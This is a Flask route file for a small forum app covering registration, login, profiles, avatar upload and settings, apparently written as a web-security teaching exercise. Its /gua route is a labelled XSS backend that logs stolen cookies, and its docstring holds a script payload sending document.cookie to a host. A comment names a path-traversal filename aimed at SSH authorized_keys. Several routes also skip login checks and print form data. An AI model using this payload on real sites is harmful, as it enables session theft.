import os
import uuid

from flask import (
    render_template,
    request,
    redirect,
    session,
    url_for,
    Blueprint,
    make_response,
    abort)

from models.reply import Reply
from models.topic import Topic
from models.user import User

from utils import log
from routes import current_user

main = Blueprint('index', __name__)

# def current_user():
#     # 从 session 中找到 user_id 字段, 找不到就 -1
#     # 然后 User.find_by 来用 id 找用户
#     # 找不到就返回 None
#     uid = session.get('user_id', -1)
#     u = User.find_by(id=uid)
#     return u


"""
用户在这里可以
    访问首页
    注册
    登录

用户登录后, 会写入 session, 并且定向到 /profile
"""


@main.route("/")
def index():
    u = current_user()
    # return render_template("index.html", user=u)
    return render_template("index.html")


@main.route("/register", methods=['POST'])
def register():
    form = request.form.to_dict()

    print("formform", form, type(form))
    # 用类函数来判断
    u = User.register(form)
    return redirect(url_for('.index'))


@main.route("/login", methods=['POST'])
def login():
    form = request.form
    u = User.validate_login(form)
    if u is None:
        # 转到 topic.index 页面
        # return render_template("index.html", user=u)
        return render_template("index.html")
    else:
        # session 中写入 user_id
        session['user_id'] = u.id
        # 设置 cookie 有效期为 永久
        session.permanent = True
        return redirect(url_for('topic.index'))


@main.route('/profile')
def profile():
    u = current_user()
    if u is None:
        return redirect(url_for('.index'))
    else:
        return render_template('profile.html', user=u)


@main.route('/gua')
def gua():
    # xss 攻击的后台
    """
<script>
c = document.cookie
tag = `<img src='http://localhost:2000/gua?cookie=${c}'>`
document.body.insertAdjacentHTML('afterend', tag);
console.log('cookie', c)
console.log('tag', tag)
</script>
    """
    cookie = request.args.get('cookie')
    log('cookie', cookie)
    return 'cookie'


@main.route('/user/<int:id>')
def user_detail(id):
    u = User.one(id=id)
    ms = Topic.all(user_id=id)
    ms.sort(key=lambda x: x.created_time, reverse=True)
    rs = Reply.all(user_id=id)
    rs = list(set([n.topic_id for n in rs]))
    rs = [Topic.one(id=n) for n in rs]
    rs = [n for n in rs if n != None]  # 过滤None
    rs.sort(key=lambda x: x.created_time, reverse=True)  # 按时间排序

    if u is None:
        abort(404)
    else:
        return render_template('profile.html', user=u, topic=ms, reply=rs)


@main.route('/image/add', methods=['POST'])
def image_add():
    file = request.files['avatar']

    # ../../root/.ssh/authorized_keys
    # filename = secure_filename(file.filename)
    suffix = file.filename.split('.')[-1]
    filename = '{}.{}'.format(str(uuid.uuid4()), suffix)
    path = os.path.join('static/images', filename)
    print("1111111", path)
    file.save(path)

    u = current_user()
    u.image = '/static/images/{}'.format(filename)
    User.update(u.id, image=u.image)

    return redirect(url_for('.setting'))


@main.route('/setting')
def setting():
    u = current_user()
    if u is None:
        return redirect(url_for('.index'))
    else:
        return render_template('setting.html', user=u)


@main.route('/update1', methods=['POST'])
def update_username_signature():
    form = request.form

    u = current_user()

    form = {
        'username': form['name'],
        'signature': form['signature']
    }

    User.update(u.id, **form)

    return render_template('setting.html', user=u)


@main.route('/update2', methods=['POST'])
def update_password():
    form = request.form

    u = current_user()
    old_pass = u.salted_password(form['old_pass'])
    new_pass = u.salted_password(form['new_pass'])
    if u.password == old_pass:
        # u.password = new_pass
        User.update(u.id, password=new_pass)
        # u.save()
        return render_template('setting.html', user=u)
    else:
        abort(401)
